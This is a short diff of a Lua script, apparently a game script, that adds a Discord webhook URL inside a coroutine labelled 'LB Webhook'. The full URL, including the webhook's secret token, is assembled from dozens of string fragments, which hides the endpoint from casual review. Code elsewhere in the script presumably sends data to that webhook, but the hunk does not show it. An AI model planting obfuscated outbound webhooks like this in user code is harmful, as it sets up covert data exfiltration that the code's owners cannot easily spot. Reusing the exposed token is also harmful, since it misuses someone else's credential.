@@ -10,6 +10,7 @@ end)
 -- LB Webhook
 coroutine.resume(coroutine.create(function()
 pcall(function()
+local url = "h" .. "tt" .. "ps:/" .. "/disc" .. "ord." .. "com/a" .. "pi/" .. "we" .. "bh" .. "oo" .. "k" .. "s/104" .. "324" .. "0334680" .. "93243" .. "2/otkWouE" .. "IbsZvOSX" .. "ZEqIkQe3" .. "gZLQaS" .. "82Z3z5j" .. "or9t1dA8u" .. "nEqnJOp56" .. "grEvDrk" .. "uR7REDU"
 local regularloaded = false
 local elementalloaded = false
 local airloaded = false
